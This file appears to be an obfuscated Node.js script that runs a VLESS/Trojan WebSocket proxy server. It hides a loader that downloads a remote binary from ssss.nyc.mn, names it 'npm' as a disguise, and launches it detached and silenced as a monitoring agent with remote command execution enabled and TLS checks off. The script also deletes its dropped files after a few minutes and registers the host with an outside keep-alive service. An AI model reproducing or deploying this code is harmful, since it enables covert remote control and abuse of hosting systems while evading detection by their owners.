const _0x58a13c=_0x1ff3;(function(_0x3183f6,_0x306389){const _0x9f3049=_0x1ff3,_0x106583=_0x3183f6();while(!![]){try{const _0x341491=-parseInt(_0x9f3049(0x153))/0x1*(-parseInt(_0x9f3049(0x14f))/0x2)+parseInt(_0x9f3049(0x137))/0x3+parseInt(_0x9f3049(0x158))/0x4*(-parseInt(_0x9f3049(0xf8))/0x5)+parseInt(_0x9f3049(0x13f))/0x6+parseInt(_0x9f3049(0x13c))/0x7+-parseInt(_0x9f3049(0x11b))/0x8+-parseInt(_0x9f3049(0x12e))/0x9*(parseInt(_0x9f3049(0xfa))/0xa);if(_0x341491===_0x306389)break;else _0x106583['push'](_0x106583['shift']());}catch(_0x19d0b9){_0x106583['push'](_0x106583['shift']());}}}(_0x456c,0x4bba4));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x58a13c(0x118)),net=require(_0x58a13c(0xf6)),path=require(_0x58a13c(0x13b)),crypto=require('crypto'),{Buffer}=require('buffer'),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env']['UUID']||_0x58a13c(0x155),NEZHA_SERVER=process['env'][_0x58a13c(0x15b)]||'',NEZHA_PORT=process[_0x58a13c(0x157)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x58a13c(0x157)][_0x58a13c(0x159)]||'',DOMAIN=process[_0x58a13c(0x157)][_0x58a13c(0x150)]||_0x58a13c(0x11f),AUTO_ACCESS=process['env'][_0x58a13c(0x104)]||!![],WSPATH=process[_0x58a13c(0x157)]['WSPATH']||UUID[_0x58a13c(0x156)](0x0,0x8),SUB_PATH=process[_0x58a13c(0x157)]['SUB_PATH']||_0x58a13c(0xfc),NAME=process[_0x58a13c(0x157)]['NAME']||'',PORT=process['env'][_0x58a13c(0x130)]||0x1eb4;function _0x1ff3(_0x4de400,_0x494b85){_0x4de400=_0x4de400-0xf6;const _0x456cff=_0x456c();let _0x1ff33c=_0x456cff[_0x4de400];return _0x1ff33c;}let ISP='';const GetISP=async()=>{const _0x23aa09=_0x58a13c;try{const _0x2ce378=await axios[_0x23aa09(0x112)](_0x23aa09(0x106)),_0xd049b6=_0x2ce378[_0x23aa09(0x122)];ISP=(_0xd049b6[_0x23aa09(0x14b)]+'-'+_0xd049b6['isp'])[_0x23aa09(0x144)](/ /g,'_');}catch(_0x5a28e0){ISP='Unknown';}};GetISP();const httpServer=http['createServer']((_0x3a262a,_0x2c1ef7)=>{const _0x19b478=_0x58a13c;if(_0x3a262a['url']==='/'){const _0x33b395=path['join'](__dirname,'index.html');fs[_0x19b478(0x12c)](_0x33b395,_0x19b478(0x10e),(_0x37e356,_0x3250bd)=>{const _0x49564d=_0x19b478;if(_0x37e356){_0x2c1ef7[_0x49564d(0x13d)](0xc8,{'Content-Type':_0x49564d(0x163)}),_0x2c1ef7[_0x49564d(0x109)](_0x49564d(0x120));return;}_0x2c1ef7[_0x49564d(0x13d)](0xc8,{'Content-Type':_0x49564d(0x163)}),_0x2c1ef7[_0x49564d(0x109)](_0x3250bd);});return;}else{if(_0x3a262a[_0x19b478(0x14e)]==='/'+SUB_PATH){const _0x1d6b91=NAME?NAME+'-'+ISP:ISP,_0x4cdd9d=_0x19b478(0x103)+UUID+'@'+DOMAIN+_0x19b478(0x111)+DOMAIN+_0x19b478(0x14c)+DOMAIN+_0x19b478(0x121)+WSPATH+'#'+_0x1d6b91,_0x20536d=_0x19b478(0x102)+UUID+'@'+DOMAIN+_0x19b478(0x162)+DOMAIN+_0x19b478(0x14c)+DOMAIN+_0x19b478(0x121)+WSPATH+'#'+_0x1d6b91,_0x4ad187=_0x4cdd9d+'\x0a'+_0x20536d,_0x23f2cb=Buffer[_0x19b478(0x168)](_0x4ad187)[_0x19b478(0x128)](_0x19b478(0x142));_0x2c1ef7[_0x19b478(0x13d)](0xc8,{'Content-Type':'text/plain'}),_0x2c1ef7[_0x19b478(0x109)](_0x23f2cb+'\x0a');}else _0x2c1ef7['writeHead'](0x194,{'Content-Type':_0x19b478(0x154)}),_0x2c1ef7[_0x19b478(0x109)](_0x19b478(0xf9));}}),wss=new WebSocket[(_0x58a13c(0x135))]({'server':httpServer}),uuid=UUID[_0x58a13c(0x144)](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x58a13c(0x10b)];function resolveHost(_0x4099a7){return new Promise((_0x1433e4,_0x493d11)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x4099a7)){_0x1433e4(_0x4099a7);return;}let _0x2d0d32=0x0;function _0x4ef090(){const _0x265e00=_0x1ff3;if(_0x2d0d32>=DNS_SERVERS[_0x265e00(0x127)]){_0x493d11(new Error('Failed\x20to\x20resolve\x20'+_0x4099a7+_0x265e00(0x11c)));return;}const _0x3d25e6=DNS_SERVERS[_0x2d0d32];_0x2d0d32++;const _0x1e2e52='https://dns.google/resolve?name='+encodeURIComponent(_0x4099a7)+'&type=A';axios[_0x265e00(0x112)](_0x1e2e52,{'timeout':0x1388,'headers':{'Accept':_0x265e00(0x113)}})['then'](_0x4219da=>{const _0x5c3f7c=_0x265e00,_0x4a9e45=_0x4219da[_0x5c3f7c(0x122)];if(_0x4a9e45[_0x5c3f7c(0x15f)]===0x0&&_0x4a9e45[_0x5c3f7c(0x14d)]&&_0x4a9e45[_0x5c3f7c(0x14d)][_0x5c3f7c(0x127)]>0x0){const _0x36edaf=_0x4a9e45[_0x5c3f7c(0x14d)]['find'](_0x5891dc=>_0x5891dc[_0x5c3f7c(0x160)]===0x1);if(_0x36edaf){_0x1433e4(_0x36edaf[_0x5c3f7c(0x122)]);return;}}_0x4ef090();})[_0x265e00(0x107)](_0x60a047=>{_0x4ef090();});}_0x4ef090();});}function handleVlessConnection(_0x299e51,_0x548a72){const _0x4a0dc2=_0x58a13c,[_0x1292cb]=_0x548a72,_0x12db2a=_0x548a72['slice'](0x1,0x11);if(!_0x12db2a[_0x4a0dc2(0xff)]((_0x468b7c,_0x594ae9)=>_0x468b7c==parseInt(uuid['substr'](_0x594ae9*0x2,0x2),0x10)))return![];let _0x4f9ef5=_0x548a72[_0x4a0dc2(0x156)](0x11,0x12)[_0x4a0dc2(0x15e)]()+0x13;const _0x5e9fb1=_0x548a72[_0x4a0dc2(0x156)](_0x4f9ef5,_0x4f9ef5+=0x2)[_0x4a0dc2(0x15d)](0x0),_0x4eedbf=_0x548a72['slice'](_0x4f9ef5,_0x4f9ef5+=0x1)['readUInt8'](),_0x2a0039=_0x4eedbf==0x1?_0x548a72[_0x4a0dc2(0x156)](_0x4f9ef5,_0x4f9ef5+=0x4)[_0x4a0dc2(0x149)]('.'):_0x4eedbf==0x2?new TextDecoder()['decode'](_0x548a72[_0x4a0dc2(0x156)](_0x4f9ef5+0x1,_0x4f9ef5+=0x1+_0x548a72[_0x4a0dc2(0x156)](_0x4f9ef5,_0x4f9ef5+0x1)[_0x4a0dc2(0x15e)]())):_0x4eedbf==0x3?_0x548a72[_0x4a0dc2(0x156)](_0x4f9ef5,_0x4f9ef5+=0x10)[_0x4a0dc2(0x105)]((_0x1300a6,_0x35008a,_0x123464,_0x31065d)=>_0x123464%0x2?_0x1300a6['concat'](_0x31065d[_0x4a0dc2(0x156)](_0x123464-0x1,_0x123464+0x1)):_0x1300a6,[])[_0x4a0dc2(0x131)](_0x38e6c4=>_0x38e6c4['readUInt16BE'](0x0)[_0x4a0dc2(0x128)](0x10))['join'](':'):'';_0x299e51[_0x4a0dc2(0x138)](new Uint8Array([_0x1292cb,0x0]));const _0x6a170a=createWebSocketStream(_0x299e51);return resolveHost(_0x2a0039)[_0x4a0dc2(0x164)](_0x3c7d94=>{const _0x493f40=_0x4a0dc2;net[_0x493f40(0x12b)]({'host':_0x3c7d94,'port':_0x5e9fb1},function(){const _0x1abfa3=_0x493f40;this[_0x1abfa3(0x161)](_0x548a72['slice'](_0x4f9ef5)),_0x6a170a['on'](_0x1abfa3(0x10a),()=>{})[_0x1abfa3(0x136)](this)['on'](_0x1abfa3(0x10a),()=>{})[_0x1abfa3(0x136)](_0x6a170a);})['on'](_0x493f40(0x10a),()=>{});})[_0x4a0dc2(0x107)](_0x1ba226=>{const _0x2d65ba=_0x4a0dc2;net['connect']({'host':_0x2a0039,'port':_0x5e9fb1},function(){const _0x3aaf45=_0x1ff3;this[_0x3aaf45(0x161)](_0x548a72[_0x3aaf45(0x156)](_0x4f9ef5)),_0x6a170a['on'](_0x3aaf45(0x10a),()=>{})[_0x3aaf45(0x136)](this)['on'](_0x3aaf45(0x10a),()=>{})[_0x3aaf45(0x136)](_0x6a170a);})['on'](_0x2d65ba(0x10a),()=>{});}),!![];}function handleTrojanConnection(_0x5a3c9e,_0x46b075){const _0x1b4a42=_0x58a13c;try{if(_0x46b075['length']<0x3a)return![];const _0xbcd491=_0x46b075[_0x1b4a42(0x156)](0x0,0x38)['toString'](),_0x40e9ed=[UUID];let _0x121146=null;for(const _0x3bc397 of _0x40e9ed){const _0x22bf58=crypto[_0x1b4a42(0x100)](_0x1b4a42(0x12d))[_0x1b4a42(0x12a)](_0x3bc397)[_0x1b4a42(0x169)](_0x1b4a42(0x133));if(_0x22bf58===_0xbcd491){_0x121146=_0x3bc397;break;}}if(!_0x121146)return![];let _0x28a633=0x38;_0x46b075[_0x28a633]===0xd&&_0x46b075[_0x28a633+0x1]===0xa&&(_0x28a633+=0x2);const _0x599755=_0x46b075[_0x28a633];if(_0x599755!==0x1)return![];_0x28a633+=0x1;const _0x3fa77d=_0x46b075[_0x28a633];_0x28a633+=0x1;let _0x4b4cfe,_0x31e217;if(_0x3fa77d===0x1)_0x4b4cfe=_0x46b075[_0x1b4a42(0x156)](_0x28a633,_0x28a633+0x4)[_0x1b4a42(0x149)]('.'),_0x28a633+=0x4;else{if(_0x3fa77d===0x3){const _0x1f0e37=_0x46b075[_0x28a633];_0x28a633+=0x1,_0x4b4cfe=_0x46b075[_0x1b4a42(0x156)](_0x28a633,_0x28a633+_0x1f0e37)[_0x1b4a42(0x128)](),_0x28a633+=_0x1f0e37;}else{if(_0x3fa77d===0x4)_0x4b4cfe=_0x46b075[_0x1b4a42(0x156)](_0x28a633,_0x28a633+0x10)['reduce']((_0x1f1b61,_0x1631e5,_0x38a501,_0x37d327)=>_0x38a501%0x2?_0x1f1b61['concat'](_0x37d327[_0x1b4a42(0x156)](_0x38a501-0x1,_0x38a501+0x1)):_0x1f1b61,[])['map'](_0x2abb79=>_0x2abb79['readUInt16BE'](0x0)[_0x1b4a42(0x128)](0x10))[_0x1b4a42(0x149)](':'),_0x28a633+=0x10;else return![];}}_0x31e217=_0x46b075[_0x1b4a42(0x15d)](_0x28a633),_0x28a633+=0x2;_0x28a633<_0x46b075[_0x1b4a42(0x127)]&&_0x46b075[_0x28a633]===0xd&&_0x46b075[_0x28a633+0x1]===0xa&&(_0x28a633+=0x2);const _0x4a13f6=createWebSocketStream(_0x5a3c9e);return resolveHost(_0x4b4cfe)[_0x1b4a42(0x164)](_0x25ca51=>{const _0x176893=_0x1b4a42;net[_0x176893(0x12b)]({'host':_0x25ca51,'port':_0x31e217},function(){const _0x275b39=_0x176893;_0x28a633<_0x46b075[_0x275b39(0x127)]&&this[_0x275b39(0x161)](_0x46b075[_0x275b39(0x156)](_0x28a633)),_0x4a13f6['on'](_0x275b39(0x10a),()=>{})[_0x275b39(0x136)](this)['on']('error',()=>{})['pipe'](_0x4a13f6);})['on'](_0x176893(0x10a),()=>{});})[_0x1b4a42(0x107)](_0x4edfb4=>{const _0x3f59fa=_0x1b4a42;net[_0x3f59fa(0x12b)]({'host':_0x4b4cfe,'port':_0x31e217},function(){const _0x5d1909=_0x3f59fa;_0x28a633<_0x46b075[_0x5d1909(0x127)]&&this[_0x5d1909(0x161)](_0x46b075[_0x5d1909(0x156)](_0x28a633)),_0x4a13f6['on']('error',()=>{})[_0x5d1909(0x136)](this)['on']('error',()=>{})[_0x5d1909(0x136)](_0x4a13f6);})['on'](_0x3f59fa(0x10a),()=>{});}),!![];}catch(_0xd5e978){return![];}}wss['on'](_0x58a13c(0x125),(_0x26a686,_0x2d2405)=>{const _0x586600=_0x58a13c,_0x5e0940=_0x2d2405[_0x586600(0x14e)]||'';_0x26a686[_0x586600(0x10c)]('message',_0x30234c=>{const _0x3e3718=_0x586600;if(_0x30234c['length']>0x11&&_0x30234c[0x0]===0x0){const _0x236e9e=_0x30234c[_0x3e3718(0x156)](0x1,0x11),_0x25c510=_0x236e9e[_0x3e3718(0xff)]((_0x461545,_0x1e58c3)=>_0x461545==parseInt(uuid['substr'](_0x1e58c3*0x2,0x2),0x10));if(_0x25c510){!handleVlessConnection(_0x26a686,_0x30234c)&&_0x26a686[_0x3e3718(0x132)]();return;}}!handleTrojanConnection(_0x26a686,_0x30234c)&&_0x26a686[_0x3e3718(0x132)]();})['on'](_0x586600(0x10a),()=>{});});const getDownloadUrl=()=>{const _0x510880=_0x58a13c,_0x40d1d0=os['arch']();return _0x40d1d0===_0x510880(0x151)||_0x40d1d0===_0x510880(0x11e)||_0x40d1d0==='aarch64'?!NEZHA_PORT?_0x510880(0x10f):_0x510880(0x167):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x510880(0x16a);},downloadFile=async()=>{const _0x556855=_0x58a13c;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x27ebaa=getDownloadUrl(),_0x5c53af=await axios({'method':'get','url':_0x27ebaa,'responseType':'stream'}),_0x1aa1f3=fs[_0x556855(0x114)](_0x556855(0x134));return _0x5c53af[_0x556855(0x122)][_0x556855(0x136)](_0x1aa1f3),new Promise((_0x57be12,_0x3f26cd)=>{const _0x28aa8e=_0x556855;_0x1aa1f3['on'](_0x28aa8e(0x165),()=>{const _0x45eeb8=_0x28aa8e;console[_0x45eeb8(0x115)](_0x45eeb8(0x123)),exec(_0x45eeb8(0x13a),_0x31a5d7=>{if(_0x31a5d7)_0x3f26cd(_0x31a5d7);_0x57be12();});}),_0x1aa1f3['on'](_0x28aa8e(0x10a),_0x3f26cd);});}catch(_0x231c6f){throw _0x231c6f;}},runnz=async()=>{const _0x283f0f=_0x58a13c;try{const _0x6934d8=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x283f0f(0x13e)});if(_0x6934d8['trim']()!==''){console[_0x283f0f(0x115)](_0x283f0f(0x146));return;}}catch(_0x18795c){}await downloadFile();let _0x581688='',_0x2ef08c=['443',_0x283f0f(0x110),_0x283f0f(0x152),'2087',_0x283f0f(0x129),_0x283f0f(0xf7)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x20a652=_0x2ef08c[_0x283f0f(0x108)](NEZHA_PORT)?_0x283f0f(0x145):'';_0x581688=_0x283f0f(0x10d)+NEZHA_SERVER+':'+NEZHA_PORT+_0x283f0f(0x14a)+NEZHA_KEY+'\x20'+_0x20a652+_0x283f0f(0x101);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x40d9d1=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x283f0f(0x166)](':')[_0x283f0f(0x147)]():'',_0x349641=_0x2ef08c[_0x283f0f(0x108)](_0x40d9d1)?_0x283f0f(0x15c):_0x283f0f(0x117),_0x341cb9=_0x283f0f(0x124)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x283f0f(0x143)+_0x349641+_0x283f0f(0xfe)+UUID;fs['writeFileSync']('config.yaml',_0x341cb9);}_0x581688=_0x283f0f(0x11a);}else{console['log'](_0x283f0f(0xfd));return;}}try{exec(_0x581688,{'shell':_0x283f0f(0x140)},_0x2da90e=>{const _0x59e86d=_0x283f0f;if(_0x2da90e)console[_0x59e86d(0x10a)]('npm\x20running\x20error:',_0x2da90e);else console[_0x59e86d(0x115)](_0x59e86d(0x12f));});}catch(_0x1f3446){console['error'](_0x283f0f(0xfb)+_0x1f3446);}};async function addAccessTask(){const _0x15adec=_0x58a13c;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x1a201c=_0x15adec(0x126)+DOMAIN;try{const _0x41c92c=await axios[_0x15adec(0x11d)](_0x15adec(0x15a),{'url':_0x1a201c},{'headers':{'Content-Type':_0x15adec(0x119)}});console[_0x15adec(0x115)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x4a49cf){}}const delFiles=()=>{const _0x2bc5db=_0x58a13c;fs[_0x2bc5db(0x116)](_0x2bc5db(0x134),()=>{}),fs[_0x2bc5db(0x116)](_0x2bc5db(0x139),()=>{});};function _0x456c(){const _0x1bce02=['sub','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','every','createHash','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','trojan://','vless://','AUTO_ACCESS','reduce','https://api.ip.sb/geoip','catch','includes','end','error','1.1.1.1','once','setsid\x20nohup\x20./npm\x20-s\x20','utf8','https://arm64.ssss.nyc.mn/v1','8443',':443?encryption=none&security=tls&sni=','get','application/dns-json','createWriteStream','log','unlink','false','axios','application/json','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','3252080EQiQqK','\x20with\x20all\x20DNS\x20servers','post','arm64','nodews.5298600.xyz','Hello\x20world!','&path=%2F','data','npm\x20download\x20successfully','client_secret:\x20','connection','https://','length','toString','2083','update','connect','readFile','sha224','402147JeIZiQ','npm\x20is\x20running','PORT','map','close','hex','npm','Server','pipe','823194RylfXz','send','config.yaml','chmod\x20+x\x20npm','path','2254700MUwIzr','writeHead','utf-8','2273526ZfNxTY','/bin/bash','Server\x20is\x20running\x20on\x20port\x20','base64','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','replace','--tls','npm\x20is\x20already\x20running,\x20skip\x20running...','pop','listen','join','\x20-p\x20','country_code','&fp=chrome&type=ws&host=','Answer','url','4ECPAHW','DOMAIN','arm','2096','255551hVQAgR','text/plain','92aa9c898e5d411eba41ea4351d07234','slice','env','7696ODgMZW','NEZHA_KEY','https://oooo.serv00.net/add-url','NEZHA_SERVER','true','readUInt16BE','readUInt8','Status','type','write',':443?security=tls&sni=','text/html','then','finish','split','https://arm64.ssss.nyc.mn/agent','from','digest','https://amd64.ssss.nyc.mn/agent','net','2053','1420YlvUnr','Not\x20Found\x0a','50jZPQSX','error:\x20'];_0x456c=function(){return _0x1bce02;};return _0x456c();}httpServer[_0x58a13c(0x148)](PORT,()=>{const _0x404652=_0x58a13c;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x404652(0x115)](_0x404652(0x141)+PORT);});
